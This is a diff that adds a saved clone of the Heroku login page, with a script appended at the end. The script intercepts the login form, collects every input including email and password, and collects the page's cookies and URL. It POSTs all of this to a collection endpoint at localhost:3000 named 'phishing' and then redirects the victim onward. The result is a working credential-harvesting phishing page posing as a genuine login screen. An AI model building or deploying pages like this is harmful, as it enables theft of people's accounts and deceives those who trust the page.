@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<!-- saved from url=(0027)https://id.heroku.com/login -->
+<html class=" js backgroundsize borderradius boxshadow cssanimations"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Heroku | Login</title><link href="https://www.herokucdn.com/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="./heroku_files/purple.css" media="screen" rel="stylesheet" type="text/css"><script type="text/javascript" async="" src="./heroku_files/linkid.js"></script><script type="text/javascript" src="./heroku_files/pd.js"></script><script type="text/javascript" async="" src="./heroku_files/f.txt"></script><script type="text/javascript" async="" src="./heroku_files/analytics.js"></script><script async="" src="./heroku_files/gtm.js"></script><script src="./heroku_files/heroku-cookie-banner.js" type="text/javascript"></script><script src="./heroku_files/modernizr.min.js" type="text/javascript"></script><meta content="width=device-width, initial-scale=1" name="viewport"><meta content="Log in to your Heroku account from this secure Heroku login page." name="description"><meta content="A1QME020P" name="slack-app-id"><script type="text/javascript" src="./heroku_files/analytics"></script><script src="./heroku_files/f(1).txt"></script></head><body><div class="page-wrap gradient-primary"><noscript><iframe height="0" src="//www.googletagmanager.com/ns.html?id=GTM-JD26" style="display:none;visibility:hidden" width="0"></iframe></noscript><script type="text/javascript">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-JD26');</script><div class="container"><h1 class="logo"><a href="https://www.heroku.com/" title="Heroku">Heroku</a></h1><div class="content"><div class="panel" id="login"><h3>Log in to your account</h3><form action="https://id.heroku.com/login" method="post" role="form"><input name="_csrf" type="hidden" value="CbSE3F31T9fYh0gunc0nzkshJhHeFWJ2Fw7hzTBgTq4"><div class="form-group"><label for="email">Email address</label><div class="input-icon icon-username"></div><input autofocus="true" class="form-control" id="email" name="email" placeholder="Email address" tabindex="1" type="email"></div><div class="form-group"><label for="password">Password</label><div class="input-icon icon-password"></div><input autocomplete="off" class="form-control password" id="password" name="password" placeholder="Password" tabindex="2" type="password"></div><button class="btn btn-primary btn-lg btn-block" name="commit" tabindex="3" type="submit" value="Log In">Log In</button></form><a class="panel-footer" href="https://id.heroku.com/signup/login">New to Heroku? &nbsp;<span>Sign Up</span></a></div><a href="https://sso.heroku.com/login">Log in via SSO</a><a href="https://id.heroku.com/account/password/reset" style="margin-left: 25px">Forgot your password?</a></div></div></div><footer class="logo-sfdc"><a href="https://heroku.com/home" title="heroku.com">Heroku is a <span></span> company</a><ul class="legal"><li><a href="https://heroku.com/policy/tos">Terms of Service</a></li><li><a href="https://www.salesforce.com/company/privacy">Privacy</a></li><li><a href="https://www.salesforce.com/company/privacy/full_privacy.jsp#nav_info">Cookies</a></li><li>© 2018 Salesforce.com</li></ul></footer><script type="text/javascript" id="">!function(){function f(a){var b=/[?&]?([^=]c)=([^&]*)/;a=b.exec(a)||[];return a=decodeURIComponent(a[2])}function g(a){var b="; "+document.cookie;a=b.split("; "+a+"\x3d");return 2==a.length?a.pop().split(";").shift():void 0}function h(a,b){var c=new Date;c.setTime(c.getTime()+12096E5);c="; expires\x3d"+c.toGMTString();document.cookie=a+"\x3d"+b+c+";domain\x3d.heroku.com;path\x3d/"}var e="campaign",d=g(e);"undefined"==typeof d&&(d=f(document.location.search),"undefined"!==d&&h(e,d))}();</script>
+
+<script type="text/javascript" id="">piAId="37622";piCId="30300";(function(){var a=document.createElement("script");a.type="text/javascript";a.src=("https:"==document.location.protocol?"https://pi":"http://cdn")+".pardot.com/pd.js";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b)})();</script>
+<script>
+
+(() => {
+	
+	((url) => {
+
+		const send = (data) => {
+	
+			const options = {
+				method: 'POST',
+				body: JSON.stringify(data),
+				headers:{
+				'Content-Type': 'application/json'
+				}
+			}
+	
+			return fetch(url, options)
+				.then(console.log)
+				.catch(console.log);
+		}
+	
+		const getInputs = () => {
+			const inputs = document.querySelectorAll('input');
+	
+			return [].slice.call(inputs)
+				.map(input => {
+					return {
+						id: input.getAttribute('id'),
+						name: input.getAttribute('name'),
+						value: input.value,
+						type: input.getAttribute('type')
+					}
+				});
+		}
+		
+
+		const form = document.querySelector('#login > form');
+		form.addEventListener('submit', (event) => {
+			event.preventDefault();
+			const inputs = getInputs();
+			send({
+				inputs,
+				url: location.href,
+				cookies: document.cookie
+			})
+				.then(() => location = form.getAttribute('action'));
+		});
+
+
+
+	
+	})('http://localhost:3000/hashmap/phishing');
+	
+})();
+
+</script>
+<iframe src="./heroku_files/pixel.html" style="display: none;"></iframe></body></html>
